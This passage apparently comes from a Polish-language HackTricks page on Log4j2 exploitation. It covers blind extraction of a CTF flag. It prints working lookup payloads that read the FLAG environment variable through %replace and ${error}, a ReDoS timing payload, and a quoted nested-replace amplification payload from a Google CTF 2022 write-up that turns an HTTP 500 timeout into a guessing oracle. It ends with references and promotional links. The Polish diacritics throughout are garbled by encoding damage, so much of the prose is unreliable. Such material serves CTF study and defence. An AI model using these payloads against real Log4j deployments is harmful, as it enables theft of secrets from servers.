Wykorzystujc to zachowanie, mo偶na spowodowa, 偶e **zastpienie wywoa wyjtek, jeli wyra偶enie regularne pasuje** do czegokolwiek wewntrz acucha znak贸w (i brak wyjtku, jeli nie zostanie znalezione) w ten spos贸b:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Op贸藕nienie czasowe**

Jak wspomniano w poprzednim rozdziale, **`%replace`** obsuguje **wyra偶enia regularne**. Dlatego mo偶liwe jest u偶ycie adunku z [strony ReDoS](../regular-expression-denial-of-service-redos.md), aby spowodowa **op贸藕nienie** w przypadku znalezienia flagi.\
Na przykad adunek taki jak `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` spowoduje **op贸藕nienie** w tamtym CTF.

W tym [**opisie**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), zamiast u偶ywa ataku ReDoS, u偶yto ataku **amplifikacji** w celu spowodowania r贸偶nicy czasu w odpowiedzi:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Jeli flaga zaczyna si od `flagGuess`, caa flaga zostanie zastpiona 29 znakami `#` (u偶yem tego znaku, poniewa偶 prawdopodobnie nie bdzie czci flagi). **Ka偶dy z wynikowych 29 znak贸w `#` jest nastpnie zastpowany przez 54 znaki `#`**. Ten proces jest powtarzany **6 razy**, co daje w sumie ` 29*54*54^6* =`` `` `**`96816014208`** **znak贸w `#`!**
>
> Zastpienie tak wielu znak贸w `#` spowoduje wywoanie 10-sekundowego limitu czasowego aplikacji Flask, co z kolei skutkuje wysaniem kodu stanu HTTP 500 do u偶ytkownika. (Jeli flaga nie zaczyna si od `flagGuess`, otrzymamy kod stanu inny ni偶 500)

## Odnoniki

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**Try Hard Security Group**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub grupy [**telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
